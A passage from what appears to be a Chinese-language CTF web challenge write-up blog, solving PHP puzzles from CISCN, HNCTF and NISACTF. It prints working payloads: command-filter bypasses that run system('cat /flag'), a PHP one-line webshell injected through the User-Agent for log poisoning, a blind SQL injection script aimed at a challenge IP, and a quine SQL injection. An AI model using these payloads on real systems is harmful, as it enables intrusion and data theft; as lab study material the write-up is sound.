class=\"variable\">$get_flag</span>, <span class=\"string\">&quot; &quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$get_flag</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&quot;cat&quot;</span>, <span class=\"string\">&quot;wctf2020&quot;</span>, <span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;快到非洲了&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>第一关，尝试绕过 intval 函数<br>\n不加 1 的情况下，1e10 被认为是字符串，intval (“1e10”) 就是 1<br>\n 然后 &quot;1e10&quot;+1,&quot;1e10&quot; 会被转换成整数，就是 1*10 的 10 次方再加 1</p>\n<p>第二关:<br>\n 要求找一个 md 加密前后都是 0e 开头的数字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0e215962017</span><br></pre></td></tr></table></figure>\n<p>第三关:<br>\n 过滤了空格，cat<br>\n 空格用 ${IFS} 代替，cat 用 <code>c\\at</code>  代替</p>\n<h2 id=\"39ciscn-2019初赛love-math\"><a class=\"markdownIt-Anchor\" href=\"#39ciscn-2019初赛love-math\">#</a> 39.[CISCN 2019 初赛] Love Math</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//例子 c=20-1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$content</span>) &gt;= <span class=\"number\">80</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;太长了不会算&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\t&#x27;</span>, <span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>, <span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>, <span class=\"string\">&#x27;`&#x27;</span>, <span class=\"string\">&#x27;\\[&#x27;</span>, <span class=\"string\">&#x27;\\]&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$content</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&#x27;abs&#x27;</span>, <span class=\"string\">&#x27;acos&#x27;</span>, <span class=\"string\">&#x27;acosh&#x27;</span>, <span class=\"string\">&#x27;asin&#x27;</span>, <span class=\"string\">&#x27;asinh&#x27;</span>, <span class=\"string\">&#x27;atan2&#x27;</span>, <span class=\"string\">&#x27;atan&#x27;</span>, <span class=\"string\">&#x27;atanh&#x27;</span>, <span class=\"string\">&#x27;base_convert&#x27;</span>, <span class=\"string\">&#x27;bindec&#x27;</span>, <span class=\"string\">&#x27;ceil&#x27;</span>, <span class=\"string\">&#x27;cos&#x27;</span>, <span class=\"string\">&#x27;cosh&#x27;</span>, <span class=\"string\">&#x27;decbin&#x27;</span>, <span class=\"string\">&#x27;dechex&#x27;</span>, <span class=\"string\">&#x27;decoct&#x27;</span>, <span class=\"string\">&#x27;deg2rad&#x27;</span>, <span class=\"string\">&#x27;exp&#x27;</span>, <span class=\"string\">&#x27;expm1&#x27;</span>, <span class=\"string\">&#x27;floor&#x27;</span>, <span class=\"string\">&#x27;fmod&#x27;</span>, <span class=\"string\">&#x27;getrandmax&#x27;</span>, <span class=\"string\">&#x27;hexdec&#x27;</span>, <span class=\"string\">&#x27;hypot&#x27;</span>, <span class=\"string\">&#x27;is_finite&#x27;</span>, <span class=\"string\">&#x27;is_infinite&#x27;</span>, <span class=\"string\">&#x27;is_nan&#x27;</span>, <span class=\"string\">&#x27;lcg_value&#x27;</span>, <span class=\"string\">&#x27;log10&#x27;</span>, <span class=\"string\">&#x27;log1p&#x27;</span>, <span class=\"string\">&#x27;log&#x27;</span>, <span class=\"string\">&#x27;max&#x27;</span>, <span class=\"string\">&#x27;min&#x27;</span>, <span class=\"string\">&#x27;mt_getrandmax&#x27;</span>, <span class=\"string\">&#x27;mt_rand&#x27;</span>, <span class=\"string\">&#x27;mt_srand&#x27;</span>, <span class=\"string\">&#x27;octdec&#x27;</span>, <span class=\"string\">&#x27;pi&#x27;</span>, <span class=\"string\">&#x27;pow&#x27;</span>, <span class=\"string\">&#x27;rad2deg&#x27;</span>, <span class=\"string\">&#x27;rand&#x27;</span>, <span class=\"string\">&#x27;round&#x27;</span>, <span class=\"string\">&#x27;sin&#x27;</span>, <span class=\"string\">&#x27;sinh&#x27;</span>, <span class=\"string\">&#x27;sqrt&#x27;</span>, <span class=\"string\">&#x27;srand&#x27;</span>, <span class=\"string\">&#x27;tan&#x27;</span>, <span class=\"string\">&#x27;tanh&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">preg_match_all</span>(<span class=\"string\">&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;</span>, <span class=\"variable\">$content</span>, <span class=\"variable\">$used_funcs</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$used_funcs</span>[<span class=\"number\">0</span>] <span class=\"keyword\">as</span> <span class=\"variable\">$func</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$func</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//帮你算出答案</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;echo &#x27;</span> . <span class=\"variable\">$content</span> . <span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>计算器功能，一个白名单，可以用一些函数，其他字母都会被过滤，还有一个黑名单过滤了很多东西，长度 &lt;=80<br>\n 这里学习一个函数 base_convert ()<br>\n 具体用法看这里<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX21hdGhfYmFzZV9jb252ZXJ0LmFzcA==\">函数语法</span><br>\n这里构造的高进制数字会当作字符串处理，而不是当作数字处理<br>\n这里我们要构造_GET<br>\n 介绍两个函数:<br>\ndechex () 将十进制转换成 16 进制<br>\n hex2bin (): 将 16 进制转换为 ASCII 码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[]被黑名单过滤可以用&#123;&#125;替代</span><br><span class=\"line\">_GET可以用hex2bin转换,_GET的16进制是5f 47 45 54</span><br><span class=\"line\">_GET=hex2bin(5f 47 45 54)</span><br><span class=\"line\">但是hex2bin是白名单以外的函数,可用base_convert的高进制转换为字符串,即:</span><br><span class=\"line\">hex2bin=base_convert(37907361743,10,36)</span><br><span class=\"line\">还有:</span><br><span class=\"line\">5f 47 45 54也不能直接填,会被匹配当作函数名放进白名单中检查</span><br><span class=\"line\">5f474554=dechex(1598506324)</span><br><span class=\"line\">因此:</span><br><span class=\"line\">_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">?c=$cos=base_convert(37907361743,10,36)(dechex(1598506324));($$cos)&#123;1&#125;(($$cos)&#123;2&#125;)&amp;1=system&amp;2=cat /flag</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"40hnctf-2022-week2easy_include\"><a class=\"markdownIt-Anchor\" href=\"#40hnctf-2022-week2easy_include\">#</a> 40.[HNCTF 2022 WEEK2]easy_include</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//WEB手要懂得搜索</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i&quot;</span>, <span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>data 协议不能用，file 协议可以用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///etc/passwd</span><br><span class=\"line\">但是过滤了flag和php关键字</span><br></pre></td></tr></table></figure>\n<p>这里学到个新知识：日志注入<br>\n抓包，改？file=/var/log/nginx/access.log<br>\n 然后在 user-agent 里写一句话木马或者直接执行命令即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: &lt;?php system(&#x27;cat /ffflllaaaggg&#x27;);?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_GET[&#x27;a&#x27;]); ?&gt;</span><br><span class=\"line\">url:</span><br><span class=\"line\">?file=/var/log/nginx/access.log&amp;a=system(&#x27;cat /ffflllaaaggg&#x27;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"41nisactf-2022hardsql\"><a class=\"markdownIt-Anchor\" href=\"#41nisactf-2022hardsql\">#</a> 41.[NISACTF 2022]hardsql</h2>\n<p>考点:quine 注入<br>\n用户名只能是 bilala, 密码是字符型，fuzz 一下发现空格被过滤，用 <code>/**/</code>  替代<br>\n可以用布尔盲注脚本跑出密码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"> </span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://1.14.71.254:28860/login.php&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">str</span> = <span class=\"string\">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">62</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>:</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">&#x27;bilala&#x27;</span>, <span class=\"string\">&quot;passwd&quot;</span>:<span class=\"string\">f&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;<span class=\"subst\">&#123;flag+j&#125;</span>%&#x27;#&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response = requests.post(url, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;nothing found&quot;</span> <span class=\"keyword\">not</span>  <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">            flag = flag + j</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"comment\">#b2f2d15b3ae082ca29697d8dcd420fd7</span></span><br></pre></td></tr></table></figure>\n<p>登录得到了源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//多加了亿点点过滤</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include_once</span>(<span class=\"string\">&quot;config.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">alertMes</span>(<span class=\"params\"><span class=\"variable\">$mes</span>, <span class=\"variable\">$url</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;<span class=\"subst\">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class=\"subst\">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkSql</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\\\\$|char|\\x0a|\\x09|column|sleep|\\ /i&quot;</span>, <span class=\"variable\">$s</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&#x27;waf here&#x27;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] != <span class=\"string\">&#x27;&#x27;</span> &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>] != <span class=\"string\">&#x27;&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$username</span> !== <span class=\"string\">&#x27;bilala&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&#x27;only bilala can login&#x27;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">checkSql</span>(<span class=\"variable\">$password</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class=\"subst\">$password</span>&#x27;;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$user_result</span> = <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$MysqlLink</span>, <span class=\"variable\">$sql</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"variable\">$user_result</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"variable\">$row</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&#x27;nothing found&#x27;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;passwd&#x27;</span>] === <span class=\"variable\">$password</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$password</span> == <span class=\"string\">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"variable\">$FLAG</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&quot;wrong password&quot;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>关键在传入的 passwd, 要强等于 password 且不等于 b2f2d15b3ae082ca29697d8dcd420fd7, 这里要控制 passwd 的输入输出一样，就需要 quine 注入，<a href=\"https://hq185187.github.io/2023/05/12/nssctf2/#25hdctf-2023loginmaster\"> 具体过滤看这里</a>，这里 char 被过滤用 0x 替代<br>\n payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>\n<h2 id=\"42ciscn-2022-初赛ezpop\"><a class=\"markdownIt-Anchor\" href=\"#42ciscn-2022-初赛ezpop\">#</a> 42.[CISCN 2022 初赛] ezpop</h2>\n<p>打开发现是 thinkphpv6.0.12 版本，扫一下目录发现 www.zip, 可以下载源码.<mark> 此题考查 thinkphp 框架审计，找个 exp</mark></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span 